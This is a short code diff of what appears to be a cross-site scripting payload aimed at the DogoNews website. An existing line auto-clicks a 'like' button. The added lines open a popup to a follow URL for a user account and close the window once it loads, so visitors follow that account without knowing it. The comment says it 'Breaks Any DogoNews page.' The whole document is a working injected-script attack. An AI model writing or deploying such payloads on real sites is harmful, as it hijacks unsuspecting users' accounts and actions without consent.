@@ -1,5 +1,7 @@
 $(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
 
+var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
+myPopup.addEventListener('load', window.close, false); //close window when finished
 
 /*
 Breaks Any DogoNews page:
